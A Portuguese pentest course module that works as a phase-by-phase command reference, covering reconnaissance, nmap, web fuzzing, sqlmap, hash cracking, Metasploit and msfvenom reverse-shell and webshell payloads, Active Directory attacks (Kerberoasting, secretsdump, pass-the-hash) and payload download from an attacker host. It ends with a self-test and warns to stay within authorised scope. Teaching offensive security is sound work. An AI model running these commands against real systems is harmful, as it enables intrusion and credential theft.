# 05 · Manual de uso — referência de comandos por tarefa

`Nível: intermediário` · `Última atualização: 12/08/2026`

Referência para **consultar**, não para ler de ponta a ponta. Organizado por tarefa, na ordem
das fases de um pentest. Cada seção tem os comandos que você realmente usa, os atalhos que só
quem usa há anos conhece, e o que está obsoleto.

> ⚖️ Todo comando aqui toca o alvo de verdade. Rode apenas contra o seu laboratório ou contra
> escopo autorizado por escrito. Ver [`12`](12-etica-lei-e-contrato.md).

**Legenda:** 🔥 = o que você usa toda semana · ⚠️ = barulhento/detectável · 💀 = obsoleto ou
substituído.

---

## 1. Reconhecimento e OSINT

### Descoberta de subdomínios e ativos
```bash
subfinder -d exemplo.com -all -silent            # 🔥 passivo, consulta várias fontes
amass enum -passive -d exemplo.com               #    mais fontes, mais lento
assetfinder --subs-only exemplo.com              #    alternativa rápida
```
```bash
# Encadeamento canônico: achar subdomínios → ver quais respondem HTTP → escanear
subfinder -d exemplo.com -silent | httpx -silent -title -tech-detect -status-code
```

### Resolução e infraestrutura
```bash
dnsx -l subdominios.txt -a -resp                 # resolve em massa
dig +short exemplo.com any                        # registros DNS
whois exemplo.com                                 # dono, datas, servidores
```

### OSINT
```bash
theHarvester -d exemplo.com -b all               # e-mails, hosts, nomes
```
- **Google dorks:** `site:exemplo.com filetype:pdf`, `intitle:"index of"`, `inurl:admin`
- **Shodan** ([shodan.io](https://shodan.io)): `org:"Empresa"`, `port:445 country:BR` — busca
  o que já está exposto e indexado, **sem tocar no alvo**.
- **crt.log / certificados** ([crt.sh](https://crt.sh)): `%.exemplo.com` revela subdomínios
  por certificados TLS emitidos. 🔥 Fonte que muita gente esquece.

Aprofundamento: [`14-reconhecimento-e-osint.md`](14-reconhecimento-e-osint.md).

---

## 2. Varredura de portas e serviços — nmap

O nmap é a ferramenta que você mais vai usar. Vale decorar estes.

### Receitas por tarefa

```bash
sudo nmap -sn 10.0.0.0/24                         # 🔥 quem está vivo (host discovery)
sudo nmap -sV -sC -oN quick.txt ALVO              # 🔥 varredura padrão (top 1000 + scripts)
sudo nmap -sV -sC -p- -T4 -oN full.txt ALVO       # 🔥 todas as portas
sudo nmap -sU --top-ports 50 ALVO                 #    UDP (DNS, SNMP, etc.) — lento, mas importa
sudo nmap -p 445 --script smb-vuln* ALVO          #    scripts de vulnerabilidade de um serviço
sudo nmap -sV -p- -oA alvo ALVO                   #    -oA salva nos 3 formatos (normal, grep, XML)
```

### Tipos de varredura (o que muda por dentro)

| Flag | Nome | Precisa root? | Quando |
|---|---|---|---|
| `-sS` | SYN / half-open | sim | 🔥 padrão; rápido, não completa o handshake |
| `-sT` | TCP connect | não | quando não tem root; mais barulhento |
| `-sU` | UDP | sim | serviços UDP; lento por natureza |
| `-sA` | ACK | sim | mapear regras de firewall |
| `-sn` | ping scan | — | só descoberta de host |
| `-Pn` | — | — | 🔥 pula o ping; use quando o host bloqueia ICMP mas está vivo |

### Flags de tempo e evasão

| Flag | Efeito |
|---|---|
| `-T0`…`-T5` | de paranoico (lento, furtivo) a insano (rápido, barulhento). `-T4` para lab, `-T2/-T3` para produção sensível |
| `-Pn` | trata o host como vivo mesmo sem responder ping |
| `-f` / `--mtu` | fragmenta pacotes (evasão básica de IDS) ⚠️ |
| `-D RND:5` | usa iscas (decoys) — mistura seu IP com falsos ⚠️ |
| `--source-port 53` | finge vir da porta 53 (às vezes fura ACL antiga) |
| `-oN/-oG/-oX/-oA` | 🔥 **sempre salve.** `-oG` é grep-friendly; `-oX` alimenta outras ferramentas |

**Atalho de veterano:** `nmap` com `-oA` e depois `grep -h Ports *.gnmap | ...` para extrair
IPs por porta. E: `nmap --script-updatedb` após instalar scripts novos.

**💀 Obsoleto:** `-sR` (RPC scan, absorvido pelo `-sV`); `--script=all` (perigoso e lentíssimo,
inclui scripts intrusivos e de DoS — nunca em produção).

Aprofundamento: [`15-varredura-e-enumeracao.md`](15-varredura-e-enumeracao.md).

---

## 3. Enumeração de serviços específicos

### Web — descoberta de conteúdo
```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
     -u https://ALVO/FUZZ -mc 200,301,302,403      # 🔥 ffuf é o padrão atual (rápido, em Go)
```
```bash
feroxbuster -u https://ALVO -w LISTA -x php,txt,html  # 🔥 recursivo por padrão
gobuster dir -u https://ALVO -w LISTA -x php,html     #    clássico, ainda ótimo
```
```bash
# Fuzzing de subdomínio virtual (vhost) — troca o Host header
ffuf -w LISTA -u https://ALVO -H "Host: FUZZ.exemplo.com" -fs 0
```
```bash
whatweb https://ALVO                                  # tecnologias do site
nikto -h https://ALVO                                 # ⚠️ scanner web clássico, barulhento
nuclei -u https://ALVO                                # 🔥 scanner por templates, atual
```

**Atalho:** em `ffuf`, use `-mc` (match code), `-fc` (filter code), `-fs` (filter size),
`-fw` (filter words) para tirar o ruído. `-recursion -recursion-depth 2` para descer em pastas.

**💀 `dirb` e `dirbuster`** ainda funcionam, mas `ffuf`/`feroxbuster` os substituíram por
velocidade.

### SMB / Windows
```bash
netexec smb ALVO                                      # 🔥 sucessor do CrackMapExec
netexec smb ALVO -u '' -p '' --shares                 # sessão nula: lista compartilhamentos
netexec smb ALVO -u user -p senha --users             # enumera usuários do domínio
enum4linux-ng -A ALVO                                 # enumeração ampla de SMB/LDAP
smbclient -L //ALVO/ -N                               # lista shares sem senha
smbclient //ALVO/share -N                             # conecta num share
```
> **💀 `crackmapexec`** foi descontinuado; **`netexec` (nxc)** é o sucessor mantido. Se um
> tutorial usa `crackmapexec`, troque por `netexec` — a sintaxe é quase idêntica.

### Outros serviços
```bash
snmpwalk -v2c -c public ALVO                          # SNMP com community padrão vaza MUITA coisa
showmount -e ALVO                                     # exports NFS
onesixtyone -c communities.txt ALVO                   # força bruta de community SNMP
```

---

## 4. Interceptação web — Burp Suite

Não é linha de comando; é fluxo. As abas que importam:

| Aba | Para quê |
|---|---|
| **Proxy** | 🔥 intercepta e edita requisições ao vivo. `Ctrl+F` liga/desliga o intercept |
| **Repeater** | 🔥 reenvia e modifica uma requisição quantas vezes quiser. Onde você vive |
| **Intruder** | automatiza variações (força bruta, fuzzing). Limitado na Community |
| **Decoder** | codifica/decodifica base64, URL, hex |
| **Comparer** | diff entre duas respostas |
| **Extensions / BApp** | plugins (ex.: *Autorize* para testar autorização, *JWT Editor*) |

**Atalhos que economizam horas:**
- `Ctrl+R` — manda a requisição selecionada para o Repeater.
- `Ctrl+I` — manda para o Intruder.
- `Ctrl+Shift+B` — codifica em base64 a seleção; `Ctrl+Shift+U` decodifica URL.
- Botão direito → *Copy as curl command* — reproduz fora do Burp.
- *Target → Site map* → botão direito no host → *Add to scope*, depois filtre "in scope only"
  para não afogar em ruído.

Alternativas gratuitas: **OWASP ZAP** (equivalente open source) e **Caido** (moderno).
Configuração do certificado: [`03-instalacao.md`](03-instalacao.md) §7.1.

---

## 5. Injeção de SQL — sqlmap

```bash
sqlmap -u "https://ALVO/item?id=1" --batch                 # 🔥 detecção automática
sqlmap -u "https://ALVO/item?id=1" --dbs                   # lista bancos
sqlmap -u "https://ALVO/item?id=1" -D loja --tables        # tabelas de um banco
sqlmap -u "https://ALVO/item?id=1" -D loja -T users --dump # extrai uma tabela
sqlmap -r requisicao.txt --batch                           # 🔥 usa requisição salva do Burp (com POST/cookies)
sqlmap -u "..." --level 5 --risk 3                         # mais agressivo (mais testes, mais barulho ⚠️)
sqlmap -u "..." --os-shell                                 # tenta shell no SO (quando dá)
```
**Atalho:** salve a requisição pelo Burp (botão direito → *Copy to file*) e use `-r`. Resolve
autenticação, cookies e POST de uma vez, sem montar a linha na mão.

---

## 6. Quebra de senha e hashes

### Identificar o hash
```bash
hashid '$2y$10$...'            # diz o provável tipo
hash-identifier               # interativo
nth '<hash>'                  # name-that-hash, mais moderno
```

### John the Ripper (versátil, ótimo para formatos variados)
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt   # 🔥 ataque de dicionário
john --show hashes.txt                                        # mostra o que já quebrou
john --format=NT hashes.txt --wordlist=LISTA                  # especifica o formato
# Ferramentas "2john" convertem arquivos em hash: zip2john, ssh2john, keepass2john...
zip2john arquivo.zip > hash.txt && john hash.txt
```

### Hashcat (rápido, usa GPU)
```bash
hashcat -m 0 -a 0 hashes.txt rockyou.txt        # -m 0 = MD5, -a 0 = dicionário
hashcat -m 1000 ntlm.txt rockyou.txt            # -m 1000 = NTLM
hashcat -m 22000 handshake.hc22000 rockyou.txt  # -m 22000 = WPA2
hashcat -m 0 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule  # 🔥 com regras
```
| `-m` | Tipo |
|---|---|
| 0 | MD5 |
| 100 | SHA1 |
| 1000 | NTLM |
| 1800 | sha512crypt (`$6$`, Linux moderno) |
| 3200 | bcrypt (`$2*$`) — **lento de propósito**, quase inquebrável em dicionário grande |
| 13100 | Kerberos RC4 (Kerberoasting) |
| 18200 | Kerberos AS-REP |
| 22000 | WPA-PBKDF2 |

**Atalho de veterano:** regras (`best64`, `dive`, `OneRuleToRuleThemAll`) multiplicam sua
lista sem precisar de listas gigantes. `--force` só em último caso. `--username` quando o
arquivo tem `user:hash`.

### Força bruta em serviço (online)
```bash
hydra -l admin -P rockyou.txt ssh://ALVO                       # 🔥 SSH
hydra -L users.txt -P pass.txt ALVO http-post-form \
  "/login:user=^USER^&pass=^PASS^:F=incorreta"                 # formulário web
netexec smb ALVO -u users.txt -p pass.txt                      # spray em SMB
```
> ⚠️ Força bruta online é barulhenta e tranca contas. Em teste real, **spray** (uma senha
> comum em muitos usuários) costuma ser melhor que força bruta (muitas senhas num usuário),
> porque não estoura a política de bloqueio. Pense antes de disparar.

---

## 7. Exploração e shells — Metasploit

```bash
msfconsole -q                                   # inicia sem banner
```
```
search type:exploit platform:windows smb        # busca com filtros
use exploit/windows/smb/ms17_010_eternalblue     # seleciona (pode usar o índice do search)
info                                             # o que o módulo faz, opções, referências
show options                                     # o que precisa configurar
set RHOSTS 10.0.0.5
set LHOST 10.0.0.10                              # SEU IP, para a conexão de volta
show payloads                                    # cargas compatíveis
set PAYLOAD windows/x64/meterpreter/reverse_tcp
check                                            # 🔥 testa se é vulnerável SEM explorar (quando suportado)
run          # ou exploit
```
No **meterpreter** (shell avançado do Metasploit):
```
sysinfo · getuid · hashdump · ps · migrate <pid> · shell · download/upload · portfwd
background   # volta ao msf sem fechar a sessão
sessions -l  # lista sessões · sessions -i 1 entra na sessão 1
```
**Atalhos:** `setg` define variável global (vale para todos os módulos); `resource script.rc`
roda comandos em lote; `run -j` roda em background (handler).

---

## 8. Gerar payloads — msfvenom

```bash
# Reverse shell Windows (executável)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=SEU_IP LPORT=4444 -f exe -o shell.exe
# Reverse shell Linux
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=SEU_IP LPORT=4444 -f elf -o shell.elf
# Webshell PHP
msfvenom -p php/meterpreter/reverse_tcp LHOST=SEU_IP LPORT=4444 -f raw -o shell.php
# Listar formatos e payloads
msfvenom --list formats ; msfvenom --list payloads | grep windows
```
Do lado do atacante, o "ouvinte":
```bash
# Genérico, na unha:
nc -lvnp 4444
# Ou o handler do Metasploit (para meterpreter):
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST SEU_IP; set LPORT 4444; run"
```

### Estabilizar um shell "burro" (TTY)
Truque que todo pentester usa depois de pegar um shell cru:
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'   # vira um bash de verdade
# Ctrl+Z para suspender, então no SEU terminal:
stty raw -echo; fg
# de volta no shell:
export TERM=xterm      # agora Ctrl+C, setas e clear funcionam
```

---

## 9. Pós-exploração e escalada de privilégio

```bash
# Scripts de enumeração local — apontam caminhos de escalada automaticamente
./linpeas.sh                                     # 🔥 Linux
.\winpeas.exe                                    # 🔥 Windows
sudo -l                                          # 🔥 o que posso rodar como root? (achado nº 1)
find / -perm -4000 -type f 2>/dev/null           # binários SUID (caminho clássico de escalada)
getcap -r / 2>/dev/null                          # capabilities
```
- **GTFOBins** ([gtfobins.github.io](https://gtfobins.github.io)) 🔥 — dado um binário com
  SUID ou sudo, mostra como abusar dele para virar root. Consulta obrigatória.
- **LOLBAS** ([lolbas-project.github.io](https://lolbas-project.github.io)) — o equivalente
  para binários nativos do Windows.

Aprofundamento: [`17-pos-exploracao-e-movimentacao.md`](17-pos-exploracao-e-movimentacao.md).

---

## 10. Active Directory

```bash
# Enumeração e coleta para o BloodHound
bloodhound-python -u user -p senha -d dominio.local -c all -ns IP_DC   # coletor em Python
netexec ldap DC_IP -u user -p senha --bloodhound --collection All
```
```bash
# Ataques a Kerberos (com impacket)
GetNPUsers.py dominio/ -usersfile users.txt -no-pass          # AS-REP roasting
GetUserSPNs.py dominio/user:senha -request                    # Kerberoasting
secretsdump.py dominio/user:senha@DC_IP                       # extrai hashes/segredos
```
```bash
# Movimentação lateral / execução remota
psexec.py dominio/user:senha@ALVO                             # shell SYSTEM (barulhento ⚠️)
wmiexec.py dominio/user:senha@ALVO                            # mais furtivo que psexec
netexec smb REDE/24 -u user -H HASH                           # pass-the-hash em massa
evil-winrm -i ALVO -u user -p senha                           # shell WinRM interativo
```
Aprofundamento: [`20-active-directory.md`](20-active-directory.md).

---

## 11. Transferir arquivos para o alvo

Você vai fazer isto o tempo todo (subir linpeas, baixar loot):
```bash
# No atacante: sobe um servidor HTTP na pasta atual
python3 -m http.server 8000
# No alvo: baixa
wget http://SEU_IP:8000/linpeas.sh        # Linux
curl http://SEU_IP:8000/linpeas.sh -o l.sh
certutil -urlcache -f http://SEU_IP:8000/x.exe x.exe   # Windows sem powershell
# PowerShell:
iwr http://SEU_IP:8000/x.exe -OutFile x.exe
```
```bash
# SMB é ótimo para Windows (impacket sobe um servidor na hora):
smbserver.py -smb2support share ./           # no atacante
# no alvo Windows:  copy \\SEU_IP\share\x.exe .
```

---

## 12. Tabela-resumo: uma ferramenta por tarefa (2026)

| Tarefa | Padrão atual | Alternativa | Obsoleto (💀) |
|---|---|---|---|
| Subdomínios | `subfinder` | `amass`, `assetfinder` | `sublist3r` |
| Provar HTTP vivo | `httpx` | `httprobe` | — |
| Port scan | `nmap` | `masscan` (rápido, impreciso), `rustscan` | — |
| Diretórios web | `ffuf`, `feroxbuster` | `gobuster` | `dirb`, `dirbuster` |
| Scanner por template | `nuclei` | — | — |
| SMB/AD | `netexec` (nxc) | `impacket` | `crackmapexec` |
| Proxy web | Burp Suite | ZAP, Caido | — |
| SQLi | `sqlmap` | manual + Burp | — |
| Quebra de hash | `hashcat` (GPU), `john` (CPU/formatos) | — | — |
| Força bruta serviço | `netexec` (spray), `hydra` | `medusa` | — |
| AD graph | BloodHound (CE) | — | BloodHound legado (interface antiga) |

---

## Autoteste

1. Qual a diferença entre `-sS` e `-sT` no nmap, e quando você é obrigado a usar o segundo?
2. Por que `netexec` substituiu `crackmapexec`?
3. Você tem um POST autenticado com cookie de sessão para testar SQLi. Qual é o jeito prático
   de fazer o sqlmap usar exatamente essa requisição?
4. O que a sequência `python3 -c 'import pty...'` → `Ctrl+Z` → `stty raw -echo; fg` resolve?
5. Em força bruta contra Active Directory, por que *spray* costuma ser melhor que força bruta
   clássica?
6. Para que serve o GTFOBins, e em qual fase do ataque você o consulta?
7. Qual é o comando de escalada de privilégio que você roda **primeiro** num Linux, e por quê?
8. Cite duas ferramentas hoje consideradas obsoletas e seus substitutos.
